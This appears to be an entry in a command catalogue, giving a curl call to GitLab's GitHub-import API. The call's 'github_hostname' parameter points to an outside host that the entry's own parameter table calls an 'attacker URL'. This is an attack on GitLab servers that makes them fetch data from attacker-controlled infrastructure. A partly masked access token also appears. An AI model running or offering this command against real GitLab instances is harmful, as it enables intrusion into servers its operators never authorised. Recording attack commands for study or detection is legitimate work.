---
id: cmd-curl-import-ex
name: curl-trigger-import-example
type: command
executor: bash
data: >-
  curl "http://gitlab.example.com/api/v4/import/github" --request POST --header
  "content-type: application/json" --header "PRIVATE-TOKEN:
  3LCvKWXVF-Gadcnbxxxx" --data '{ "personal_access_token": "xxxxx", "repo_id":
  "356289002", "target_namespace": "root", "new_name": "NEW-NAME-'$(date +%s)'",
  "github_hostname": "http://ns.yvvdwf.me:80" }'
output: Import response with project details
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.342Z'
platforms:
  - Linux
tags:
  - api
  - curl
  - dynamic
verified: false
validated: true
submitted: true
---

# curl-trigger-import-example

## Command

```bash
curl "http://gitlab.example.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" --data '{ "personal_access_token": "xxxxx", "repo_id": "356289002", "target_namespace": "root", "new_name": "NEW-NAME-'$(date +%s)'", "github_hostname": "http://ns.yvvdwf.me:80" }'
```

## Description

Specific example curl command for triggering import with dynamic new_name using date timestamp.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| PRIVATE-TOKEN | Specific GitLab token | Yes |
| personal_access_token | Placeholder token | Yes |
| repo_id | Fixed repo ID | Yes |
| target_namespace | root | Yes |
| new_name | Dynamic with $(date +%s) | Yes |
| github_hostname | Specific attacker URL | Yes |

## Examples

### Basic Usage

As shown.

## Expected Output

JSON response confirming import start with unique project name.

## Related

- [[procedures/Trigger-GitHub-Import-via-API]]
